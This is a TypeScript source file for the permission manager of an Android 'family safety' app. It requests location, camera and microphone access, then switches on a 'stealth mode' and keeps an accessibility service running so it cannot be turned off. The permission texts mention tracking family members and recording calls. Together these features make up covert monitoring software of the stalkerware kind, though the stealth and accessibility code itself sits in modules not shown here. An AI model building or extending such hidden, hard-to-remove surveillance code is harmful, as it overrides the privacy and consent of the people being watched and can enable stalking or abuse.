/**
 * Permission Manager for Haven Family Safety Application
 * Handles complex permission requirements for Android devices
 */
import { Platform, Alert, AppState } from 'react-native';
import { PermissionsAndroid } from 'react-native';
import { AccessibilityManager } from './AccessibilityManager';
import { StealthModeManager } from './StealthModeManager';

export interface PermissionStatus {
  granted: boolean;
  rationale?: string;
}

class PermissionManager {
  private static instance: PermissionManager;
  private stealthModeManager: StealthModeManager;
  private accessibilityManager: AccessibilityManager;

  private constructor() {
    this.stealthModeManager = StealthModeManager.getInstance();
    this.accessibilityManager = AccessibilityManager.getInstance();
  }

  static getInstance(): PermissionManager {
    if (!PermissionManager.instance) {
      PermissionManager.instance = new PermissionManager();
    }
    return PermissionManager.instance;
  }

  /**
   * Check and request basic permissions
   */
  async checkAndRequestBasicPermissions(): Promise<boolean> {
    try {
      if (Platform.OS === 'android') {
        const requiredPermissions: string[] = [
          PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
          PermissionsAndroid.PERMISSIONS.CAMERA,
          PermissionsAndroid.PERMISSIONS.RECORD_AUDIO,
          PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
          PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE,
        ];

        for (const permission of requiredPermissions) {
          const granted = await PermissionsAndroid.check(permission);
          if (!granted) {
            const result = await this.requestPermission(permission);
            if (!result) {
              return false;
            }
          }
        }
      }
      
      // Ensure accessibility service is enabled for Vivo devices
      await this.ensureAccessibilityService();
      
      // Enable stealth mode if needed
      await this.stealthModeManager.enableStealthMode();
      
      return true;
    } catch (error) {
      console.error('Error checking and requesting permissions:', error);
      return false;
    }
  }

  /**
   * Ensure accessibility service is properly enabled for Vivo V40e
   */
  private async ensureAccessibilityService(): Promise<void> {
    try {
      // Start monitoring for accessibility service to prevent auto-turnoff
      this.accessibilityManager.startMonitoring();
      
      // Check if service is enabled and enable it if needed
      const isEnabled = await this.accessibilityManager.isServiceEnabled();
      if (!isEnabled) {
        await this.accessibilityManager.enableService();
      }
    } catch (error) {
      console.error('Error ensuring accessibility service:', error);
    }
  }

  /**
   * Request a specific permission
   */
  async requestPermission(permission: string): Promise<boolean> {
    try {
      const granted = await PermissionsAndroid.request(
        permission,
        {
          title: 'Haven Family Safety Permissions',
          message: `Haven needs ${this.getPermissionDescription(permission)} to function properly.`,
          buttonNeutral: 'Ask Me Later',
          buttonNegative: 'Cancel',
          buttonPositive: 'OK',
        }
      );
      
      return granted === PermissionsAndroid.RESULTS.GRANTED;
    } catch (error) {
      console.error('Error requesting permission:', error);
      return false;
    }
  }

  /**
   * Get description for a permission
   */
  private getPermissionDescription(permission: string): string {
    switch (permission) {
      case PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION:
        return 'location access to track family members';
      case PermissionsAndroid.PERMISSIONS.CAMERA:
        return 'camera access for snapshots and video calls';
      case PermissionsAndroid.PERMISSIONS.RECORD_AUDIO:
        return 'audio recording for call monitoring';
      case PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE:
      case PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE:
        return 'storage access to save data and media files';
      default:
        return 'this permission';
    }
  }

  /**
   * Check all permissions status
   */
  async checkAllPermissions(): Promise<Record<string, PermissionStatus>> {
    const results: Record<string, PermissionStatus> = {};
    
    if (Platform.OS === 'android') {
      const basicPermissions: string[] = [
        PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
        PermissionsAndroid.PERMISSIONS.CAMERA,
        PermissionsAndroid.PERMISSIONS.RECORD_AUDIO,
        PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
        PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE,
      ];
      
      for (const permission of basicPermissions) {
        const granted = await PermissionsAndroid.check(permission);
        results[permission] = {
          granted,
          rationale: this.getPermissionDescription(permission)
        };
      }
    }
    
    return results;
  }

  /**
   * Get status of a specific permission
   */
  async checkPermissionStatus(permission: string): Promise<PermissionStatus> {
    if (Platform.OS === 'android') {
      const granted = await PermissionsAndroid.check(permission);
      return {
        granted,
        rationale: this.getPermissionDescription(permission)
      };
    }
    
    return {
      granted: false
    };
  }

  /**
   * Request a specific permission
   */
  async requestSpecificPermission(permission: string): Promise<boolean> {
    try {
      const granted = await PermissionsAndroid.request(
        permission,
        {
          title: 'Haven Family Safety Permissions',
          message: `Haven needs ${this.getPermissionDescription(permission)} to function properly.`,
          buttonNeutral: 'Ask Me Later',
          buttonNegative: 'Cancel',
          buttonPositive: 'OK',
        }
      );
      
      return granted === PermissionsAndroid.RESULTS.GRANTED;
    } catch (error) {
      console.error('Error requesting permission:', error);
      return false;
    }
  }

  /**
   * Check if stealth mode is enabled
   */
  isStealthModeEnabled(): boolean {
    return this.stealthModeManager.isStealthModeEnabled();
  }

  /**
   * Enable stealth mode for the application
   */
  async enableStealthMode(): Promise<boolean> {
    return await this.stealthModeManager.enableStealthMode();
  }
}

export const permissionManager = PermissionManager.getInstance();